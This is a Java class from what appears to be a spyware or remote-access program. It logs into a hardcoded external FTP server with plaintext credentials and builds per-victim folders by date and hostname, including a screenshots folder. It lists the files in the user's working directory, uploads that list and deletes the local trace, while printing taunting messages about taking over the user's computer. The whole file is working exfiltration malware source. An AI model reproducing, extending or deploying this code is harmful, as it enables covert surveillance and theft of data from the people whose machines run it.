package fr.mimifan.jac.ftp;

import fr.mimifan.jac.Main;
import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

import java.io.*;
import java.text.SimpleDateFormat;
import java.time.LocalDate;

public class FileTransferClient {

    FTPClient client;
    private static final FileTransferClient instance = new FileTransferClient();

    String server = "lila.vps.boxtoplay.com";
    int port = 21;
    String user = "cuties";
    String password = "GoodCutiesDontDeleteAnything";


    LocalDate date = LocalDate.now();
    String currentTime = date.getYear() + "-" + date.getMonth() + "-" + date.getDayOfMonth();

    String hostName = Main.hostname;
    String hostDirectory = currentTime + "/" + hostName;

    String screenshotsDir = hostDirectory + "/screenshots";
    String currentDirectory = hostDirectory + "/currentFolder";
    String filesDir = hostDirectory + "/files";


    public void load() {
        client = new FTPClient();
        try {
            client.connect(server, port);
            client.login(user, password);
            client.enterLocalPassiveMode();
            client.setFileType(FTP.BINARY_FILE_TYPE);
            System.out.println("Good cutie~\nEverything is for Mommy Lila :3");

            client.makeDirectory(currentTime);
            client.makeDirectory(hostDirectory);
            client.makeDirectory(screenshotsDir);
            client.makeDirectory(currentDirectory);

            System.out.println("Great, I made you a little place~");
            System.out.println("Lemme just grab a little thing~~");

            getAllFilesInCurrentDir();

            System.out.println("Perfect, I got it :33");
            System.out.println("Now you may stay and just use your (my) computer as you always do hehe~");


        } catch (IOException ex) {
            System.out.println("Error: " + ex.getMessage());
            ex.printStackTrace();
        }
    }


    public void sendFile(String path, FileInputStream inputStream) {
        try {
            boolean done = client.storeFile(path, inputStream);
            inputStream.close();
            if (done) { System.out.println("Good puppy, this is for me~"); }
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    public void getAllFilesInCurrentDir() {
        String directoryPath = System.getProperty("user.dir");
        File directory = new File(directoryPath);

        if (directory.isDirectory()) {
            File[] files = directory.listFiles();
            SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            File outputFile = new File(directory, "List" + "_" + (System.currentTimeMillis() / 1000L / 5L) + ".txt");

            try (FileWriter writer = new FileWriter(outputFile)) {
                assert files != null;
                for (File file : files) {
                    writer.write("File path : " + file.getAbsolutePath() + "\n");
                    writer.write("Last edit : " + dateFormat.format(file.lastModified()) + "\n");
                    writer.write("---------------------------------------------\n");
                }
                writer.close();
                sendFile(currentDirectory + "/" + outputFile, new FileInputStream(outputFile));
                outputFile.delete();
            } catch (IOException e) {}
        } else {
            System.out.println("You're bad, I can't do what I want :((");
        }
    }




    public void unload() {
        try {
            if (client.isConnected()) {
                client.logout();
                client.disconnect();
            }
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        System.out.println("Client logged out successfully <3");
    }

    public static FileTransferClient getInstance() {
        return instance;
    }

    public String getScreenshotsDir() {
        return screenshotsDir;
    }
}
